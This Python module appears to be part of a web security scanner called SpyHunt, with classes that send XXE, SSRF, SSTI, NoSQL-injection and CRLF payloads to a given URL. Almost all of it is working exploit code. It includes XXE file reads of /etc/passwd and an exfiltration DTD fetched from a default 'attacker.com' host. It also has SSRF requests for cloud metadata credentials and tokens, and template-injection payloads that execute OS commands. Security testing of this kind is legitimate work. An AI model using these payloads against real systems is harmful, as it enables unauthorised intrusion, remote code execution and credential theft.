"""
Advanced Security Scanners for SpyHunt
Includes XXE, SSRF, SSTI, NoSQL Injection, CRLF, and more
"""

import re
import time
import logging
import requests
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, quote_plus
from colorama import Fore, Style

logger = logging.getLogger(__name__)


class XXEScanner:
    """XML External Entity (XXE) vulnerability scanner"""
    
    def __init__(self, callback_url: Optional[str] = None):
        """
        Initialize XXE scanner
        
        Args:
            callback_url: URL for out-of-band detection
        """
        self.callback_url = callback_url or "http://attacker.com"
    
    def generate_payloads(self) -> List[Tuple[str, str]]:
        """
        Generate XXE payloads
        
        Returns:
            List of (payload_type, payload) tuples
        """
        return [
            # Classic XXE with callback
            ("classic_xxe", f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{self.callback_url}">]>
<root><data>&xxe;</data></root>'''),
            
            # Blind XXE with DTD
            ("blind_xxe", f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{self.callback_url}/xxe.dtd">%xxe;]>
<root></root>'''),
            
            # File disclosure - /etc/passwd
            ("file_disclosure_passwd", '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>'''),
            
            # File disclosure - Windows
            ("file_disclosure_win", '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>'''),
            
            # SSRF via XXE - AWS metadata
            ("ssrf_aws", '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>'''),
            
            # XXE with parameter entities
            ("parameter_entity", f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % dtd SYSTEM "{self.callback_url}/evil.dtd">
%dtd;
%all;
]>
<root><data>&send;</data></root>'''),
        ]
    
    def scan(self, url: str, timeout: int = 10) -> List[Dict]:
        """
        Scan URL for XXE vulnerabilities
        
        Args:
            url: Target URL
            timeout: Request timeout
            
        Returns:
            List of findings
        """
        findings = []
        
        for payload_type, payload in self.generate_payloads():
            try:
                response = requests.post(
                    url,
                    data=payload,
                    headers={
                        'Content-Type': 'application/xml',
                        'User-Agent': 'Mozilla/5.0'
                    },
                    timeout=timeout,
                    verify=False
                )
                
                # Check for file disclosure
                if self._check_file_disclosure(response.text, payload_type):
                    findings.append({
                        'url': url,
                        'type': 'XXE',
                        'severity': 'critical',
                        'payload_type': payload_type,
                        'payload': payload,
                        'evidence': response.text[:500]
                    })
                    logger.critical(f"XXE vulnerability found: {url} ({payload_type})")
                
                # Check for error messages indicating XXE processing
                elif self._check_xxe_errors(response.text):
                    findings.append({
                        'url': url,
                        'type': 'XXE',
                        'severity': 'high',
                        'payload_type': payload_type,
                        'payload': payload,
                        'evidence': 'XML parser error detected'
                    })
                    logger.warning(f"Possible XXE: {url} ({payload_type})")
                    
            except requests.RequestException as e:
                logger.debug(f"Request failed for {url}: {e}")
                continue
        
        return findings
    
    def _check_file_disclosure(self, response_text: str, payload_type: str) -> bool:
        """Check if response contains disclosed file content"""
        indicators = {
            'file_disclosure_passwd': [r'root:.*:/bin/', r'daemon:', r'nobody:'],
            'file_disclosure_win': [r'\[fonts\]', r'\[extensions\]', r'Windows'],
            'ssrf_aws': [r'ami-id', r'instance-id', r'iam/security-credentials']
        }
        
        if payload_type in indicators:
            return any(re.search(pattern, response_text, re.IGNORECASE) 
                      for pattern in indicators[payload_type])
        
        return False
    
    def _check_xxe_errors(self, response_text: str) -> bool:
        """Check for XML parser errors that indicate XXE processing"""
        error_indicators = [
            'XML', 'DOCTYPE', 'ENTITY', 'parser', 'external entity',
            'SAXParseException', 'XMLSyntaxError', 'libxml'
        ]
        
        return any(indicator.lower() in response_text.lower() 
                  for indicator in error_indicators)


class SSRFScanner:
    """Server-Side Request Forgery (SSRF) vulnerability scanner"""
    
    def __init__(self, callback_domain: Optional[str] = None):
        """
        Initialize SSRF scanner
        
        Args:
            callback_domain: Domain for out-of-band detection
        """
        self.callback_domain = callback_domain or "burpcollaborator.net"
    
    def generate_payloads(self) -> List[Tuple[str, str]]:
        """Generate SSRF payloads"""
        return [
            # Internal network
            ("localhost", "http://127.0.0.1"),
            ("localhost_alt", "http://localhost"),
            ("localhost_0", "http://0.0.0.0"),
            
            # AWS metadata
            ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
            ("aws_credentials", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            
            # GCP metadata
            ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
            ("gcp_token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
            
            # Azure metadata
            ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
            
            # DigitalOcean metadata
            ("do_metadata", "http://169.254.169.254/metadata/v1/"),
            
            # Bypass techniques
            ("bypass_octal", "http://0177.0.0.1"),
            ("bypass_hex", "http://0x7f.0x0.0x0.0x1"),
            ("bypass_decimal", "http://2130706433"),
            ("bypass_at", f"http://{self.callback_domain}@127.0.0.1"),
            ("bypass_subdomain", f"http://127.0.0.1.{self.callback_domain}"),
            
            # URL schema tricks
            ("file_schema", "file:///etc/passwd"),
            ("gopher_schema", "gopher://127.0.0.1:25/_MAIL"),
            
            # DNS rebinding
            ("dns_rebind", f"http://{self.callback_domain}"),
        ]
    
    def scan(self, url: str, param: str, timeout: int = 10) -> List[Dict]:
        """
        Scan for SSRF vulnerabilities
        
        Args:
            url: Target URL with parameter
            param: Parameter name to test
            timeout: Request timeout
            
        Returns:
            List of findings
        """
        findings = []
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        for payload_type, payload in self.generate_payloads():
            try:
                # Build test URL
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = parsed_url._replace(
                    query=urlencode(test_params, doseq=True)
                ).geturl()
                
                # Send request
                response = requests.get(test_url, timeout=timeout, verify=False)
                
                # Check for SSRF indicators
                if self._is_vulnerable(response, payload, payload_type):
                    findings.append({
                        'url': test_url,
                        'param': param,
                        'type': 'SSRF',
                        'severity': 'critical',
                        'payload_type': payload_type,
                        'payload': payload,
                        'evidence': response.text[:500]
                    })
                    logger.critical(f"SSRF vulnerability found: {test_url}")
                    
            except requests.RequestException as e:
                logger.debug(f"Request failed: {e}")
                continue
        
        return findings
    
    def _is_vulnerable(self, response: requests.Response, 
                      payload: str, payload_type: str) -> bool:
        """Check if response indicates SSRF vulnerability"""
        # Check for metadata exposure
        if 'metadata' in payload_type:
            metadata_indicators = [
                'ami-id', 'instance-id', 'access-key', 'secret-key',
                'security-credentials', 'token', 'project-id'
            ]
            if any(indicator in response.text.lower() 
                  for indicator in metadata_indicators):
                return True
        
        # Check for file disclosure
        if 'file' in payload_type:
            if re.search(r'root:.*:/bin/', response.text):
                return True
        
        # Check for internal service responses
        if response.status_code == 200 and len(response.text) > 0:
            # Check content type
            content_type = response.headers.get('Content-Type', '')
            if 'json' in content_type or 'xml' in content_type:
                return True
        
        return False


class SSTIScanner:
    """Server-Side Template Injection (SSTI) vulnerability scanner"""
    
    def __init__(self):
        """Initialize SSTI scanner"""
        self.payloads = {
            'jinja2': [
                ('math', '{{7*7}}', '49'),
                ('config', '{{config}}', 'SECRET_KEY'),
                ('rce', '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}', 'uid='),
            ],
            'twig': [
                ('math', '{{7*7}}', '49'),
                ('env', '{{_self.env}}', 'Twig'),
            ],
            'freemarker': [
                ('math', '${7*7}', '49'),
                ('rce', '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', 'uid='),
            ],
            'velocity': [
                ('math', '#set($x=7*7)$x', '49'),
            ],
            'erb': [
                ('math', '<%= 7*7 %>', '49'),
                ('rce', '<%= `id` %>', 'uid='),
            ],
            'smarty': [
                ('math', '{7*7}', '49'),
                ('php', '{php}echo "test";{/php}', 'test'),
            ]
        }
    
    def scan(self, url: str, param: str, timeout: int = 10) -> List[Dict]:
        """
        Scan for SSTI vulnerabilities
        
        Args:
            url: Target URL
            param: Parameter to test
            timeout: Request timeout
            
        Returns:
            List of findings
        """
        findings = []
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        for template_engine, payloads in self.payloads.items():
            for test_type, payload, expected in payloads:
                try:
                    # Build test URL
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = parsed_url._replace(
                        query=urlencode(test_params, doseq=True)
                    ).geturl()
                    
                    # Send request
                    response = requests.get(test_url, timeout=timeout, verify=False)
                    
                    # Check if payload executed
                    if expected in response.text and payload not in response.text:
                        findings.append({
                            'url': test_url,
                            'param': param,
                            'type': 'SSTI',
                            'severity': 'critical',
                            'template_engine': template_engine,
                            'test_type': test_type,
                            'payload': payload,
                            'evidence': f'Payload executed: expected "{expected}" found in response'
                        })
                        logger.critical(f"SSTI vulnerability found: {test_url} ({template_engine})")
                    
                    # Check for template errors
                    elif self._check_template_errors(response.text, template_engine):
                        findings.append({
                            'url': test_url,
                            'param': param,
                            'type': 'SSTI',
                            'severity': 'high',
                            'template_engine': template_engine,
                            'test_type': test_type,
                            'payload': payload,
                            'evidence': 'Template engine error detected'
                        })
                        logger.warning(f"Possible SSTI: {test_url} ({template_engine})")
                        
                except requests.RequestException as e:
                    logger.debug(f"Request failed: {e}")
                    continue
        
        return findings
    
    def _check_template_errors(self, response_text: str, engine: str) -> bool:
        """Check for template engine errors"""
        error_patterns = {
            'jinja2': ['jinja', 'TemplateSyntaxError', 'UndefinedError'],
            'twig': ['twig', 'Twig_Error', 'Syntax Error in template'],
            'freemarker': ['freemarker', 'FreeMarker', 'Template parsing error'],
            'velocity': ['velocity', 'VelocityException'],
            'erb': ['erb', 'SyntaxError', 'ruby'],
            'smarty': ['smarty', 'Syntax Error in template']
        }
        
        patterns = error_patterns.get(engine, [])
        return any(pattern.lower() in response_text.lower() for pattern in patterns)


class NoSQLInjectionScanner:
    """NoSQL injection vulnerability scanner"""
    
    def __init__(self):
        """Initialize NoSQL injection scanner"""
        self.payloads = {
            'mongodb': [
                ('ne_bypass', '{"$ne": null}'),
                ('gt_bypass', '{"$gt": ""}'),
                ('regex_bypass', '{"$regex": ".*"}'),
                ('where_sleep', '{"$where": "sleep(5000)"}'),
                ('js_injection', "'; return true; var dummy='"),
                ('or_bypass', "' || '1'=='1"),
            ],
            'couchdb': [
                ('selector_bypass', '{"selector": {"_id": {"$gt": null}}}'),
            ]
        }
    
    def scan(self, url: str, param: str, timeout: int = 10) -> List[Dict]:
        """
        Scan for NoSQL injection vulnerabilities
        
        Args:
            url: Target URL
            param: Parameter to test
            timeout: Request timeout
            
        Returns:
            List of findings
        """
        findings = []
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        for db_type, payloads in self.payloads.items():
            for payload_type, payload in payloads:
                try:
                    # Test URL-encoded payload
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = parsed_url._replace(
                        query=urlencode(test_params, doseq=True)
                    ).geturl()
                    
                    # Send request
                    start_time = time.time()
                    response = requests.get(test_url, timeout=timeout, verify=False)
                    elapsed = time.time() - start_time
                    
                    # Check for time-based injection
                    if 'sleep' in payload_type and elapsed >= 5:
                        findings.append({
                            'url': test_url,
                            'param': param,
                            'type': 'NoSQL Injection',
                            'severity': 'critical',
                            'db_type': db_type,
                            'payload_type': payload_type,
                            'payload': payload,
                            'evidence': f'Time-based blind injection (elapsed: {elapsed:.2f}s)'
                        })
                        logger.critical(f"NoSQL injection found: {test_url}")
                    
                    # Check for bypass indicators
                    elif self._check_bypass(response, payload_type):
                        findings.append({
                            'url': test_url,
                            'param': param,
                            'type': 'NoSQL Injection',
                            'severity': 'high',
                            'db_type': db_type,
                            'payload_type': payload_type,
                            'payload': payload,
                            'evidence': response.text[:500]
                        })
                        logger.warning(f"Possible NoSQL injection: {test_url}")
                        
                except requests.RequestException as e:
                    logger.debug(f"Request failed: {e}")
                    continue
        
        return findings
    
    def _check_bypass(self, response: requests.Response, payload_type: str) -> bool:
        """Check if authentication/authorization was bypassed"""
        bypass_indicators = [
            'welcome', 'dashboard', 'logged in', 'profile',
            'success', 'admin', 'authenticated'
        ]
        
        if 'bypass' in payload_type:
            return any(indicator in response.text.lower() 
                      for indicator in bypass_indicators)
        
        return False


class CRLFScanner:
    """CRLF Injection vulnerability scanner"""
    
    def __init__(self):
        """Initialize CRLF scanner"""
        self.payloads = [
            ('url_encoded_rn', '%0d%0aSet-Cookie:mycookie=myvalue'),
            ('url_encoded_location', '%0d%0aLocation:http://evil.com'),
            ('url_encoded_n', '%0aSet-Cookie:mycookie=myvalue'),
            ('url_encoded_r', '%0dSet-Cookie:mycookie=myvalue'),
            ('raw_rn', '\r\nSet-Cookie:mycookie=myvalue'),
            ('raw_n', '\nSet-Cookie:mycookie=myvalue'),
            ('http_smuggling', '%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK'),
            ('xss_combo', '%0d%0a%0d%0a<script>alert(1)</script>'),
        ]
    
    def scan(self, url: str, timeout: int = 10) -> List[Dict]:
        """
        Scan for CRLF injection vulnerabilities
        
        Args:
            url: Target URL
            timeout: Request timeout
            
        Returns:
            List of findings
        """
        findings = []
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        for param in params:
            for payload_type, payload in self.payloads:
                try:
                    # Build test URL
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = parsed_url._replace(
                        query=urlencode(test_params, doseq=True, safe='%')
                    ).geturl()
                    
                    # Send request
                    response = requests.get(
                        test_url,
                        allow_redirects=False,
                        timeout=timeout,
                        verify=False
                    )
                    
                    # Check if payload reflected in headers
                    for header, value in response.headers.items():
                        if 'mycookie' in value.lower() or 'evil.com' in value.lower():
                            findings.append({
                                'url': test_url,
                                'param': param,
                                'type': 'CRLF Injection',
                                'severity': 'high',
                                'payload_type': payload_type,
                                'payload': payload,
                                'evidence': f'{header}: {value}'
                            })
                            logger.warning(f"CRLF injection found: {test_url}")
                            break
                            
                except requests.RequestException as e:
                    logger.debug(f"Request failed: {e}")
                    continue
        
        return findings


# Example usage
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    print(f"{Fore.CYAN}Advanced Security Scanners Demo{Style.RESET_ALL}\n")
    
    # XXE Scanner
    print(f"{Fore.YELLOW}[*] XXE Scanner{Style.RESET_ALL}")
    xxe_scanner = XXEScanner(callback_url="http://attacker.com")
    print(f"  Generated {len(xxe_scanner.generate_payloads())} XXE payloads")
    
    # SSRF Scanner
    print(f"\n{Fore.YELLOW}[*] SSRF Scanner{Style.RESET_ALL}")
    ssrf_scanner = SSRFScanner(callback_domain="attacker.com")
    print(f"  Generated {len(ssrf_scanner.generate_payloads())} SSRF payloads")
    
    # SSTI Scanner
    print(f"\n{Fore.YELLOW}[*] SSTI Scanner{Style.RESET_ALL}")
    ssti_scanner = SSTIScanner()
    total_ssti = sum(len(payloads) for payloads in ssti_scanner.payloads.values())
    print(f"  Generated {total_ssti} SSTI payloads for {len(ssti_scanner.payloads)} template engines")
    
    # NoSQL Scanner
    print(f"\n{Fore.YELLOW}[*] NoSQL Injection Scanner{Style.RESET_ALL}")
    nosql_scanner = NoSQLInjectionScanner()
    total_nosql = sum(len(payloads) for payloads in nosql_scanner.payloads.values())
    print(f"  Generated {total_nosql} NoSQL injection payloads")
    
    # CRLF Scanner
    print(f"\n{Fore.YELLOW}[*] CRLF Injection Scanner{Style.RESET_ALL}")
    crlf_scanner = CRLFScanner()
    print(f"  Generated {len(crlf_scanner.payloads)} CRLF injection payloads")
    
    print(f"\n{Fore.GREEN}[+] All scanners initialized successfully{Style.RESET_ALL}")

